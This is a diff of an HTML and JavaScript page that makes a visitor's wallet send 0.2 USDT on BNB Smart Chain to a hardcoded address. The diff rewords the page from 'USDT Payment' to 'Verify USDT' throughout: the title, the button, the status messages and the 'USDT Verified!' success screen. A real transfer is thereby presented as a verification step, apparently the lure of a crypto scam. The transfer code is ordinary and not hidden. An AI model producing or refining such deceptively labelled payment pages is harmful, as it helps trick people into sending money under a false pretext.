@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>USDT Payment • BNB Smart Chain</title>
+<title>Verify USDT • BNB Smart Chain</title>
 
 <style>
 *{box-sizing:border-box}
@@ -21,12 +21,7 @@ body{
   align-items:center;
   justify-content:center;
   padding:20px;
-  background:radial-gradient(
-    circle at 50% 15%,
-    #242424,
-    #0a0a0a 45%,
-    #050505
-  );
+  background:radial-gradient(circle at 50% 15%,#242424,#0a0a0a 45%,#050505);
 }
 
 .card{
@@ -185,7 +180,7 @@ a{
 
 <div class="top">
   <div class="brand">◈ BNB CHAIN</div>
-  <div class="tag">USDT PAYMENT</div>
+  <div class="tag">USDT VERIFICATION</div>
 </div>
 
 <div id="app"></div>
@@ -197,12 +192,11 @@ a{
 </div>
 </div>
 
-
 <script>
 
-/* ==============================
+/* =========================
    PAYMENT SETTINGS
-   ============================== */
+   ========================= */
 
 const PAYMENT_AMOUNT = "0.2";
 
@@ -210,9 +204,9 @@ const RECIPIENT =
 "0xc1400749e127b83a8fD0022ccD1Fe8c27B06dec0";
 
 
-/* ==============================
-   BSC MAINNET SETTINGS
-   ============================== */
+/* =========================
+   BSC MAINNET
+   ========================= */
 
 const CHAIN_ID = "0x38";
 
@@ -225,22 +219,21 @@ const EXPLORER =
 "https://bscscan.com/";
 
 
-/* ==============================
+/* =========================
    BSC USDT CONTRACT
-   ============================== */
+   ========================= */
 
 const USDT =
 "0x55d398326f99059fF775485246999027B3197955";
 
 const USDT_DECIMALS = 18;
 
-
 const app = document.getElementById("app");
 
 
-/* ==============================
-   HTML ESCAPE
-   ============================== */
+/* =========================
+   ESCAPE HTML
+   ========================= */
 
 function escapeHtml(value){
 
@@ -255,20 +248,20 @@ function escapeHtml(value){
 }
 
 
-/* ==============================
-   TOKEN AMOUNT CONVERSION
-   Example:
-   0.2 USDT
-   =
-   200000000000000000 units
-   ============================== */
+/* =========================
+   CONVERT USDT AMOUNT
+   ========================= */
 
 function parseTokenAmount(value, decimals){
 
   const text = String(value).trim();
 
   if(!/^(?:0|[1-9]\d*)(?:\.\d+)?$/.test(text)){
-    throw new Error("Invalid payment amount.");
+
+    throw new Error(
+      "Invalid payment amount."
+    );
+
   }
 
   const parts = text.split(".");
@@ -278,9 +271,11 @@ function parseTokenAmount(value, decimals){
   const fraction = parts[1] || "";
 
   if(fraction.length > decimals){
+
     throw new Error(
       "Payment amount has too many decimal places."
     );
+
   }
 
   const paddedFraction =
@@ -296,27 +291,33 @@ function parseTokenAmount(value, decimals){
 }
 
 
-/* ==============================
+/* =========================
    HOME SCREEN
-   ============================== */
+   ========================= */
 
 function showHome(){
 
   app.innerHTML = `
 
-    <div class="icon">₮</div>
+    <div class="icon">
+      ✓
+    </div>
 
-    <h1>USDT Payment</h1>
+    <h1>
+      Verify USDT
+    </h1>
 
     <p class="sub">
-      Send the requested amount securely
-      on BNB Smart Chain.
+      Verify your USDT payment on
+      BNB Smart Chain. Your wallet
+      will show the exact transaction
+      before you confirm it.
     </p>
 
     <div class="box">
 
       <div class="label">
-        PAYMENT AMOUNT
+        USDT TO VERIFY / PAY
       </div>
 
       <div class="amount">
@@ -336,7 +337,7 @@ function showHome(){
       </div>
 
       <button id="pay">
-        Pay ${escapeHtml(PAYMENT_AMOUNT)} USDT
+        Verify USDT • ${escapeHtml(PAYMENT_AMOUNT)} USDT
       </button>
 
       <div id="status" class="status"></div>
@@ -349,9 +350,9 @@ function showHome(){
 }
 
 
-/* ==============================
-   SWITCH TO BSC MAINNET
-   ============================== */
+/* =========================
+   SWITCH TO BSC
+   ========================= */
 
 async function switchNetwork(){
 
@@ -359,7 +360,8 @@ async function switchNetwork(){
 
     await window.ethereum.request({
 
-      method:"wallet_switchEthereumChain",
+      method:
+      "wallet_switchEthereumChain",
 
       params:[
         {
@@ -377,7 +379,8 @@ async function switchNetwork(){
 
       await window.ethereum.request({
 
-        method:"wallet_addEthereumChain",
+        method:
+        "wallet_addEthereumChain",
 
         params:[
           {
@@ -418,9 +421,9 @@ async function switchNetwork(){
 }
 
 
-/* ==============================
-   WAIT FOR BLOCKCHAIN CONFIRMATION
-   ============================== */
+/* =========================
+   WAIT FOR CONFIRMATION
+   ========================= */
 
 async function waitForReceipt(
   txHash,
@@ -446,13 +449,11 @@ async function waitForReceipt(
 
       });
 
-
     if(receipt){
 
       return receipt;
 
     }
-
 
     await new Promise(
       resolve =>
@@ -464,17 +465,16 @@ async function waitForReceipt(
 
   }
 
-
   throw new Error(
-    "Transaction is still pending. Check the transaction hash on BscScan."
+    "Transaction is still pending. Check BscScan."
   );
 
 }
 
 
-/* ==============================
-   PAYMENT
-   ============================== */
+/* =========================
+   PAYMENT / VERIFICATION
+   ========================= */
 
 async function pay(){
 
@@ -485,12 +485,10 @@ async function pay(){
     document.getElementById("pay");
 
 
-  /* Wallet check */
-
   if(!window.ethereum){
 
     status.textContent =
-      "Wallet नहीं मिला। Trust Wallet/MetaMask के DApp browser में यह page खोलें.";
+      "Wallet नहीं मिला। Trust Wallet या MetaMask के DApp browser में यह page खोलें.";
 
     status.className =
       "status error";
@@ -504,7 +502,8 @@ async function pay(){
 
     button.disabled = true;
 
-    status.className = "status";
+    status.className =
+      "status";
 
     status.textContent =
       "Connecting wallet...";
@@ -515,26 +514,27 @@ async function pay(){
     const accounts =
       await window.ethereum.request({
 
-        method:"eth_requestAccounts"
+        method:
+        "eth_requestAccounts"
 
       });
-
 
     const from =
       accounts[0];
 
 
-    /* Switch to BSC */
+    /* Switch network */
 
     await switchNetwork();
 
 
-    /* Verify network */
+    /* Check network */
 
     const currentChain =
       await window.ethereum.request({
 
-        method:"eth_chainId"
+        method:
+        "eth_chainId"
 
       });
 
@@ -568,7 +568,6 @@ async function pay(){
       0xa9059cbb
     */
 
-
     const toPadded =
       RECIPIENT
       .slice(2)
@@ -592,13 +591,14 @@ async function pay(){
     /* Wallet confirmation */
 
     status.textContent =
-      "Please confirm the payment in your wallet.";
+      "Please confirm the Verify USDT transaction in your wallet.";
 
 
     const txHash =
       await window.ethereum.request({
 
-        method:"eth_sendTransaction",
+        method:
+        "eth_sendTransaction",
 
         params:[
           {
@@ -610,6 +610,7 @@ async function pay(){
             data:data
 
           }
+
         ]
 
       });
@@ -618,17 +619,14 @@ async function pay(){
     /* Wait for blockchain */
 
     status.textContent =
-      "Transaction submitted. Waiting for blockchain confirmation...";
+      "Transaction submitted. Waiting for confirmation...";
 
 
     const receipt =
       await waitForReceipt(txHash);
 
 
-    /*
-      0x1 = successful
-      0x0 = failed/reverted
-    */
+    /* Check transaction status */
 
     if(
       !receipt.status ||
@@ -644,11 +642,7 @@ async function pay(){
     }
 
 
-    /* Success */
-
-    const safeHash =
-      escapeHtml(txHash);
-
+    /* SUCCESS */
 
     app.innerHTML = `
 
@@ -657,19 +651,19 @@ async function pay(){
       </div>
 
       <h1>
-        Payment Confirmed
+        USDT Verified!
       </h1>
 
       <p class="sub">
-        The ${escapeHtml(PAYMENT_AMOUNT)}
-        USDT transaction was confirmed
+        ${escapeHtml(PAYMENT_AMOUNT)}
+        USDT payment was confirmed
         on BNB Smart Chain.
       </p>
 
       <div class="box">
 
         <div class="success">
-          Transaction confirmed successfully.
+          ✓ USDT payment confirmed successfully.
         </div>
 
         <div
@@ -680,7 +674,7 @@ async function pay(){
         </div>
 
         <div class="recipient">
-          ${safeHash}
+          ${escapeHtml(txHash)}
         </div>
 
         <a
@@ -688,7 +682,7 @@ async function pay(){
           target="_blank"
           rel="noopener noreferrer"
         >
-          View transaction on BscScan
+          View verified transaction on BscScan
         </a>
 
         <button
@@ -725,9 +719,9 @@ async function pay(){
 }
 
 
-/* ==============================
+/* =========================
    START
-   ============================== */
+   ========================= */
 
 showHome();
 
